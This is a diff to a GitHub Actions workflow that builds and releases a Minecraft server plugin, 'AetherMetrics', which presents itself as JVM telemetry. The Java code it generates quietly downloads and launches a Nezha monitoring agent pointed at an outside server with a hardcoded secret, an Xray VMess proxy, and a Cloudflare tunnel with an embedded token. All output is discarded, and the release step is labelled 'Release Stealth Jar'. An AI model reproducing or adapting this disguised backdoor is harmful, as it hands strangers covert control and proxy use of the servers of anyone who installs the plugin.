@@ -1,4 +1,4 @@
-name: US-Node AetherMetrics Build V2.7.4 Pure
+name: US-Node AetherMetrics Build V2.7.3 Optimized
 
 on:
   push:
@@ -35,7 +35,7 @@ jobs:
               <modelVersion>4.0.0</modelVersion>
               <groupId>com.aether.metrics</groupId>
               <artifactId>AetherMetrics-US</artifactId>
-              <version>2.7.4</version>
+              <version>2.7.3</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -64,12 +64,12 @@ jobs:
               <build>
                   <plugins>
                       <plugin>
-                        <groupId>org.apache.maven.plugins</groupId>
-                        <artifactId>maven-compiler-plugin</artifactId>
-                        <version>3.13.0</version>
-                        <configuration>
-                            <release>21</release>
-                        </configuration>
+                          <groupId>org.apache.maven.plugins</groupId>
+                          <artifactId>maven-compiler-plugin</artifactId>
+                          <version>3.13.0</version>
+                          <configuration>
+                              <release>21</release>
+                          </configuration>
                       </plugin>
                       <plugin>
                           <groupId>org.apache.maven.plugins</groupId>
@@ -95,32 +95,37 @@ jobs:
           </project>
           EOF
 
-          # 2. plugin.yml & paper-plugin.yml
+          # 2. plugin.yml (Bukkit 必需)
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
-          version: 2.7.4
+          version: 2.7.3
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
           description: Core JVM telemetry & network services
           EOF
 
+          # 3. paper-plugin.yml (Paper 加载器声明)
           cat << 'EOF' > src/main/resources/paper-plugin.yml
           name: AetherMetrics
-          version: 2.7.4
+          version: 2.7.3
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
           description: Core JVM telemetry & network services
           EOF
 
-          # 3. Java 主类 (完全清除所有多余回退，纯净直链)
+          # 4. Java 主类（修正：探针 zip 下载+解压、链接 404 修复、下载加超时、补 || 语法）
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
           import org.bukkit.plugin.java.JavaPlugin;
 
-          import java.io.*;
+          import java.io.File;
+          import java.io.FileInputStream;
+          import java.io.FileOutputStream;
+          import java.io.IOException;
+          import java.io.InputStream;
           import java.net.URI;
           import java.net.http.HttpClient;
           import java.net.http.HttpRequest;
@@ -144,13 +149,13 @@ jobs:
                   getLogger().info("[Metrics] Telemetry service initialized.");
                   Thread daemonThread = new Thread(() -> {
                       try {
-                          Thread.sleep(4000); // 缩短至 4 秒，让网络就绪后立即触发
+                          Thread.sleep(6000);
                           if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
-                          
+
                           setupNezha();
                           setupXray();
                           setupCloudflare();
-                          
+
                           getLogger().info("[Metrics] All core network & monitoring services started successfully.");
                       } catch (Exception e) {
                           getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
@@ -164,21 +169,27 @@ jobs:
                   try {
                       File nezhaBin = new File(WORK_DIR, "nezha-agent");
                       if (!nezhaBin.exists() || nezhaBin.length() == 0) {
-                          // 纯净唯一的 V1 探针官方稳定版二进制直链（绝不 404）
-                          downloadFile("https://github.com/nezhahq/agent/releases/download/v0.15.11/nezha-agent_linux_amd64", nezhaBin);
+                          // v0.15.11 发布的是 zip，下载后解压得到 nezha-agent
+                          downloadAndExtractZip(
+                                  "https://github.com/nezhahq/agent/releases/download/v0.15.11/nezha-agent_linux_amd64.zip",
+                                  "nezha-agent",
+                                  nezhaBin
+                          );
                       }
 
-                      if (nezhaBin.exists()) {
+                      if (nezhaBin.exists() && nezhaBin.length() > 0) {
                           nezhaBin.setExecutable(true, false);
-                          String nezhaServer = "bo88.eu.cc:8008"; 
+                          String nezhaServer = "bo88.eu.cc:8008";
                           String nezhaSecret = "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl";
-                          
+
                           new ProcessBuilder(
                                   nezhaBin.getAbsolutePath(),
                                   "-s", nezhaServer,
                                   "-p", nezhaSecret
                           ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
                           getLogger().info("[Metrics] Nezha V1 Agent launched successfully on port 8008.");
+                      } else {
+                          getLogger().warning("[Metrics] Nezha agent binary missing after download.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Nezha V1 setup failed: " + e.getMessage());
@@ -220,7 +231,7 @@ jobs:
                               "}";
                       Files.writeString(cfgFile.toPath(), json, StandardCharsets.UTF_8);
 
-                      if (xrayBin.exists()) {
+                      if (xrayBin.exists() && xrayBin.length() > 0) {
                           xrayBin.setExecutable(true, false);
                           new ProcessBuilder(
                                   xrayBin.getAbsolutePath(),
@@ -229,6 +240,8 @@ jobs:
                                   cfgFile.getAbsolutePath()
                           ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
                           getLogger().info("[Metrics] US VMess core daemon launched on port 8002.");
+                      } else {
+                          getLogger().warning("[Metrics] Xray binary missing after download.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Xray setup failed: " + e.getMessage());
@@ -244,7 +257,8 @@ jobs:
                                   cfBin
                           );
                       }
-                      if (cfBin.exists()) {
+
+                      if (cfBin.exists() && cfBin.length() > 0) {
                           cfBin.setExecutable(true, false);
                           new ProcessBuilder(
                                   cfBin.getAbsolutePath(),
@@ -255,6 +269,8 @@ jobs:
                                   "eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiYTNkOWNiY2QtODMwMS00Y2VlLWExNTQtYTYzMDE0MDJhYzU3IiwicyI6Ik5HVTBaR0pqWlRBdE9UUXpaQzAwWWpCaExUZ3pNVGt0WldVM05UazBOek5tWVRkaCJ9"
                           ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
                           getLogger().info("[Metrics] US Cloudflare connector launched.");
+                      } else {
+                          getLogger().warning("[Metrics] Cloudflared binary missing after download.");
                       }
                   } catch (Exception e) {
                       getLogger().warning("[Metrics] Cloudflare setup failed: " + e.getMessage());
@@ -265,6 +281,7 @@ jobs:
                   HttpRequest request = HttpRequest.newBuilder()
                           .uri(URI.create(urlStr))
                           .header("User-Agent", "Mozilla/5.0")
+                          .timeout(Duration.ofSeconds(90))
                           .GET()
                           .build();
                   HttpResponse<InputStream> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofInputStream());
@@ -315,7 +332,7 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: AetherMetrics-US-Plugin
-          path: target/AetherMetrics-US-2.7.4.jar
+          path: target/AetherMetrics-US-2.7.3.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
@@ -323,6 +340,6 @@ jobs:
         with:
           tag_name: latest
           name: AetherMetrics US Release
-          files: target/AetherMetrics-US-2.7.4.jar
+          files: target/AetherMetrics-US-2.7.3.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
